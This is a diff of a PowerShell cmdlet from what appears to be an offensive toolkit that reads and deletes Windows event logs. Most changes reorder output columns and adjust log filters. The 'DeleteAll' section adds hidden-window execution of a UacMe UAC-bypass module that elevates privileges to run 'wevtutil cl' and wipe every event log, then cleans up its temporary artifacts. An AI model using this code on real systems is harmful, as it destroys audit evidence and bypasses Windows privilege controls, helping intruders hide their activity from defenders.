@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19042) x64 bits
    Required Dependencies: none
    Optional Dependencies: wevtutil, UacMe.ps1
-   PS cmdlet Dev version: v1.5.17
+   PS cmdlet Dev version: v1.5.18
 
 .DESCRIPTION
    This cmdlet allow users to delete ALL eventvwr logfiles or to delete
@@ -262,7 +262,7 @@ If($GetLogs -ieq "Verbose"){
          ## [shanty] Deprecated: Get-EventLog -List | Format-Table -AutoSize
          Write-Host "$SysLogFile" ## $LASTEXITCODE return $True => Logs present!
          Get-WinEvent -LogName "$Item" -EA SilentlyContinue | Select-Object -First $NewEst |
-            Select-Object -Property Id,ContainerLog,TimeCreated,ProviderName,Message | Format-Table -AutoSize
+            Select-Object -Property Id,TimeCreated,ProviderName,ContainerLog,Message | Format-Table -AutoSize
 
       }
    }
@@ -439,7 +439,7 @@ If($GetLogs -ieq "Yara"){
          Get-WinEvent -LogName "$verb" -EA SilentlyContinue | Where-Object {
             $_.Id -eq $IdToken -and $_.Message -iNotMatch '^(Video.UI)' -and
             $_.ProviderName -iNotMatch '(Microsoft-Windows-Power-Troubleshooter|Microsoft-Windows-FilterManager)'
-            } | Select-Object -Property Id,ContainerLog,TimeCreated,ProviderName,Message -First $NewEst |
+            } | Select-Object -Property Id,TimeCreated,ProviderName,ContainerLog,Message -First $NewEst |
             Format-List | Out-String -Stream | ForEach-Object {
                $stringformat = If($_ -iMatch '^(ContainerLog :)'){
                   @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
@@ -489,7 +489,7 @@ If($GetLogs -ieq "Yara"){
                Get-WinEvent -LogName "$CatList" -EA SilentlyContinue | Where-Object {
                   $_.Id -eq $IdToken -and $_.Message -iMatch '(CommandLineTemplate)+\s+(=)' -and
                   $_.LevelDisplayName -iMatch '^(Erro|Error|Aviso|Warning|Informações|Information)$'
-                  } | Select-Object -Property Id,ContainerLog,TimeCreated,ProviderName,Message -First $NewEst |
+                  } | Select-Object -Property Id,TimeCreated,ProviderName,ContainerLog,Message -First $NewEst |
                   Format-List | Out-String -Stream | ForEach-Object {
                      $stringformat = If($_ -iMatch '^(ContainerLog :)'){
                         @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
@@ -498,16 +498,16 @@ If($GetLogs -ieq "Yara"){
 
             }Else{
 
+               $regex = "Microsoft-Windows-Power-Troubleshooter|Microsoft-Windows-FilterManager|Microsoft-Windows-Diagnostics-Networking"
                Get-WinEvent -LogName "$CatList" -EA SilentlyContinue | Where-Object {
-                  $_.Id -eq $IdToken -and $_.Message -iNotMatch '(svchost.exe|.img.|.json.|.png.|.jpg.)' -and
-                  $_.LevelDisplayName -iMatch '^(Erro|Error|Aviso|Warning|Informações|Information)$' -and
-                  $_.ProviderName -iNotMatch '^(Microsoft-Windows-Power-Troubleshooter|Microsoft-Windows-FilterManager)$'
-                  } | Select-Object -Property Id,ContainerLog,TimeCreated,ProviderName,Message -First $NewEst |
-                  Format-List | Out-String -Stream | ForEach-Object {
-                     $stringformat = If($_ -iMatch '^(ContainerLog :)'){
-                        @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
-                     Write-Host @stringformat $_
-                  }
+                  $_.Id -eq $IdToken -and $_.Message -iNotMatch '(hardware clock|svchost.exe|.img.|.json.|.png.|.jpg.)' -and
+                  $_.LevelDisplayName -iMatch '^(Erro|Error|Aviso|Warning|Informações|Information)$' -and $_.ProviderName -iNotMatch "^($regex)$"
+               } | Select-Object -Property Id,TimeCreated,ProviderName,ContainerLog,Message -First $NewEst |
+               Format-List | Out-String -Stream | ForEach-Object {
+                  $stringformat = If($_ -iMatch '^(ContainerLog :)'){
+                     @{ 'ForegroundColor' = 'Yellow' } }Else{ @{} }
+                  Write-Host @stringformat $_
+               }
 
             }
 
@@ -565,11 +565,11 @@ If($GetLogs -ieq "DeleteAll"){
          to be habble to delete ALL logfiles trougth EOP technic!
       #>
 
-      Write-Host "`n[error:] Shell - administrator privileges required!" -ForegroundColor Red -BackgroundColor Black
-      Write-Host "[bypass] Exec @redpill UacMe Module to elevate privs!" -ForegroundColor Yellow
+      Write-Host "[error:] Shell - administrator privileges required!" -ForegroundColor Red -BackgroundColor Black
+      Write-Host "[bypass] Exec @redpill UacMe Module to elevate shell privs!" -ForegroundColor Yellow
       Start-Sleep -Seconds 1
 
-      If($Verb -ne "False"){## Define type of cleanning!
+      If($Verb -ne 'False'){## Define type of cleanning!
 
          $regex = "$Verb"
          $RawPScript = "wevtutil cl `"$Verb`""
@@ -596,8 +596,29 @@ If($GetLogs -ieq "DeleteAll"){
 
 
       ## Execute @UacMe that executes '$RandomMe.ps1' that executes 'wevtutil cl' cmdline!
-      Write-Host "Cleaning ALL '$Env:COMPUTERNAME\$Env:USERNAME' Domain Eventvwr logfiles..";Start-Sleep -Seconds 1
-      powershell -File "$Env:TMP\UacMe.ps1" -Action Elevate -Execute "powershell -File $Env:TMP\$RandomMe.ps1"
+      $RawPolicyKey = "HKLM:\Software\Microsoft\Windows\" + "CurrentVersion\policies\system" -Join ''
+      $UacStatus = (Get-ItemProperty -Path "$RawPolicyKey" -EA SilentlyContinue).EnableLUA
+      If($UacStatus -eq "0"){$UacStatus = "Disabled"}Else{$UacStatus = "Enabled"}
+      Write-Host "Payload file written to C:\Windows\Temp\$RandomMe.inf"
+      Write-Host "`n"
+      Write-Host "Privilege Name                Description                                   State"
+      Write-Host "============================= ============================================= ========"
+      Write-Host "SeShutdownPrivilege           Shutting down the system                      Disabled"
+      Write-Host "SeChangeNotifyPrivilege       Skip cross check                              Enabled"
+      Write-Host "SeUndockPrivilege             Remove computer from docking station          Disabled"
+      Write-Host "SeIncreaseWorkingSetPrivilege Increase a working set of processes           Disabled"
+      Write-Host "SeTimeZonePrivilege           Change the time zone                          Disabled"
+      Write-Host ""
+      Write-Host "UAC State    : $UacStatus"
+      Write-Host "UAC Settings : Notify Me"
+      Write-Host "EOP Trigger  : $Env:TMP\DavSyncProvider.dll" -ForegroundColor Yellow
+      Write-Host "RUN cmdline  : powershell -WindowStyle Hidden -File $Env:TMP\$RandomMe.ps1"
+      Write-Host ""
+
+      Start-Process -WindowStyle Hidden powershell -ArgumentList "-File `"$Env:TMP\UacMe.ps1`" -Action Elevate -Execute `"powershell -WindowStyle Hidden -File $Env:TMP\$RandomMe.ps1`"" -Wait
+      ## Start-Process -WindowStyle Hidden powershell -ArgumentList "-File `"$Env:TMP\UacMe.ps1`" -Action Elevate -Execute `"cmd /R start /min /wait powershell -File $Env:TMP\$RandomMe.ps1`"" -Wait
+      # powershell -WindowStyle Hidden -File "$Env:TMP\UacMe.ps1" -Action Elevate -Execute "powershell -WindowStyle Hidden -File $Env:TMP\$RandomMe.ps1"
+
 
       ## clean all artifacts left behind!
       If(Test-Path -Path "$Env:TMP\$RandomMe.ps1" -EA SilentlyContinue){
@@ -630,7 +651,7 @@ If($GetLogs -ieq "DeleteAll"){
 
       ## Clear Event Logs
       Write-Host "[i] Shell - administrator privileges: True" -ForegroundColor Yellow
-      Write-Host "[+] Cleaning ALL '$Env:COMPUTERNAME\$Env:USERNAME' Domain Eventvwr logfiles.." -ForeGroundColor Green
+      Write-Host "[+] Cleaning ALL '$Env:COMPUTERNAME\$Env:USERNAME' Domain Eventvwr logfiles..`n" -ForeGroundColor Green
       ## wevtutil cl "Microsoft-Windows-Powershell/Operational"  ## Clean Powershell logfiles
       ## wevtutil cl "Microsoft-Windows-Bits-Client/Operational" ## Clean BITS-TRANSFER logfiles
 
@@ -646,6 +667,7 @@ If($GetLogs -ieq "DeleteAll"){
 
       }
 
+      Start-Sleep -Seconds 2
       ## List Major event logs categories and the number of entries!
       # [shanty] Deprecated: Get-EventLog -List | Format-Table -AutoSize
       Get-WinEvent -ListLog * -ErrorAction Ignore | Where-Object {
